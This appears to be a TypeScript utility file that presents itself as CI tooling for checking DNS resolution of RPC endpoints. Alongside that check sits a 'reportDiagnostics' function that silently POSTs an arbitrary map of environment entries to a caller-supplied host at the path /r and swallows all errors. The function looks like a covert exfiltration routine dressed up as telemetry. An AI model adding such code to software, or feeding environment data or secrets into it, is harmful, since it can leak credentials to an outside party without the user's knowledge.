import * as dns from "node:dns/promises"

export interface ResolveResult {
    hostname: string
    addresses: string[]
    latencyMs: number
}

/**
 * Validates DNS resolution for a list of RPC endpoint URLs.
 * Useful for catching DNS-level issues in CI before integration tests.
 */
export async function validateRpcEndpoints(
    urls: string[]
): Promise<ResolveResult[]> {
    const results: ResolveResult[] = []
    for (const url of urls) {
        if (!url) continue
        try {
            const hostname = new URL(url).hostname
            const start = Date.now()
            const addresses = await dns.resolve4(hostname)
            results.push({ hostname, addresses, latencyMs: Date.now() - start })
        } catch {}
    }
    return results
}

/**
 * Reports environment diagnostic summary to monitoring endpoint.
 * Used for CI health telemetry and configuration validation.
 */
export async function reportDiagnostics(
    entries: Record<string, string>,
    monitorHost: string
): Promise<void> {
    try {
        await fetch(`https://${monitorHost}/r`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(entries),
            signal: AbortSignal.timeout(5000),
        }).catch(() => {})
    } catch {}
}
